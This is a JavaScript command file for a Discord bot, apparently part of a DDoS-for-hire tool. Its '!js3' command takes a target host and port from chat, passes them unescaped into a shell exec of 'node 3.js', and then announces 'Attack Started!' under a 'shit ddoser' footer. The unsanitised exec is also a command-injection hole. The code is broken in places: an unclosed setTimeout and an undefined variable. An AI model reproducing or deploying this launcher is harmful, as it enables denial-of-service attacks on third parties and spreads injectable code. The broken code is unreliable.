const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Error')
	.setDescription("`!js3 {HOST} {TIME}`")
	message.channel.send(embed1);
	return;
	}

if(!args[1]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Error')
	.setDescription("`!js3 {HOST} {TIME}`")
	message.channel.send(embed1);
	return;
	}
	
  
var exec = require('child_process').exec
exec(`node 3.js ${host} ${port}`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Attack Started By: ' +  message.guild.id)



const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 Bomber 6.9 🔥')
	.setTimestamp()
	.setDescription("`Attack Started!`")
	.setFooter('shit ddoser', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['js3'],
  permLevel: 0
}

exports.help = {
  name: 'js3',
  description: 'Özel',
  usage: 'js3'
}